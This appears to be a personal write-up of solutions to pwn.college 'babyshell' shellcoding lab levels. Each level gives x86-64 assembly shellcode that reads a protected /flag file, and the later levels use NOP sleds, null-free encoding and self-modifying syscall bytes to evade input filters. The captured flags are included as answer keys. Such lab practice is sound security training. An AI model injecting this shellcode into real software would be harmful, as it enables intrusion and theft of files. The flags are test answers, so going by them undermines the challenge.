# Useful commands
gcc -nostdlib -static -o solve.elf solve.s && objcopy --dump-section .text=solve.bin solve.elf && objdump -M intel -d solve.elf
hd solve.bin
strace ./solve.elf

## Level1
```
.global _start
.intel_syntax noprefix
_start:
# open
	mov rsi, 0
	lea rdi, [rip+flag]
	mov rax, 2 
	syscall
# read
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 100
	mov rax, 0
	syscall
# write
	mov rdi, 1
	mov rsi, rsp
	mov rdx, rax 
	mov rax, 1
	syscall
# exit
	mov rax, 60
	mov rdi, 42
	syscall
flag:
	.ascii "/flag\0"
```
(cat shellcode-raw; cat) | /challenge/babyshell_level1
pwn.college{YfXbRWPKP0McCGEmGvvcSW_dj3x.01NxIDLwIzW}

## Level2
```
.global _start
.intel_syntax noprefix
nop
nop
nop
... (1000+ nops)
nop
nop
nop
_start:
# open
	mov rsi, 0
	lea rdi, [rip+flag]
	mov rax, 2 
	syscall
# read
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 100
	mov rax, 0
	syscall
# write
	mov rdi, 1
	mov rsi, rsp
	mov rdx, rax 
	mov rax, 1
	syscall
# exit
	mov rax, 60
	mov rdi, 42
	syscall
flag:
	.ascii "/flag\0"
```
pwn.college{QlLphMJ5SVm-DAQZRqLksfU7gLN.0FOxIDLwIzW}

## Level3
```
.global _start
.intel_syntax noprefix
_start:
	mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f
	push rbx
	xor rax, rax; mov al, 2
	xor rdi, rdi; mov rdi, rsp
	xor rsi, rsi	
	syscall

	xor rdi, rdi; mov dil, 1
	xor rsi, rsi; mov rsi, rax
	xor rdx, rdx
	xor r10, r10; mov r10w, 1000
	xor rax, rax; mov al, 40
	syscall

	xor rax, rax; mov al, 60
	syscall
```
pwn.college{UPI-f0F4bGss0OPMcqtaPWF1JZJ.0VOxIDLwIzW}

## Level4
```
.global _start
.intel_syntax noprefix
_start:
# open
	mov bx, 0x7a
	push bx
	mov eax, 2
	push rsp
	pop rdi
	mov esi, 0 
	syscall
# read
	mov edi, 1 #eax
	mov esi, eax #esp
	xor edx, edx 
	mov r10, 1000 #mov edx, 100
	mov eax, 40 #0
	syscall
# write
	mov edi, 1
	mov esi, esp
	mov edx, eax 
	mov eax, 1
	syscall
# exit
	mov eax, 60
	mov edi, 42
	syscall
```
pwn.college{ceirVZqC5oQ_GEhe9n8pSxgPHs6.0FMyIDLwIzW}

## Level5
```
.global _start
.intel_syntax noprefix
_start:
# open
	mov rsi, 0
	lea rdi, [rip+flag]
	mov rax, 2 
	add word ptr [rip], 0x100
	.word 0x040f
# read
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 100
	mov rax, 0
	add word ptr [rip], 0x100
        .word 0x040f
# write
	mov rdi, 1
	mov rsi, rsp
	mov rdx, rax 
	mov rax, 1
	add word ptr [rip], 0x100
        .word 0x040f
# exit
	mov rax, 60
	mov rdi, 42
	add word ptr [rip], 0x100
        .word 0x040f
flag:
	.ascii "/flag\0"
```
pwn.college{giKTm-GPvSvbETbREZZKOE3QgFD.0VMyIDLwIzW}

## Level6
```
.global _start
.intel_syntax noprefix
_start:
	# fix syscalls
	mov byte ptr [rip+syscall1], 0x0f
	mov byte ptr [rip+syscall1+1], 0x05
	
	.rept 4096
	nop
	.endr

	# open
	mov rsi, 0
	lea rdi, [rip+flag]
	mov rax, 2

syscall1:
	.byte 0x13
	.byte 0x37 

	# read
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 100
	mov rax, 0

syscall2:
	.byte 0x13
	.byte 0x37
	
	# write
	mov rdi, 1
	mov rsi, rsp
	mov rdx, rax 
	mov rax, 1
	
syscall3:
	.byte 0x13
        .byte 0x37

	# exit
	mov rax, 60
	mov rdi, 42

syscall4:	
	.byte 0x13
        .byte 0x37
	
flag:
	.ascii "/flag\0"
```
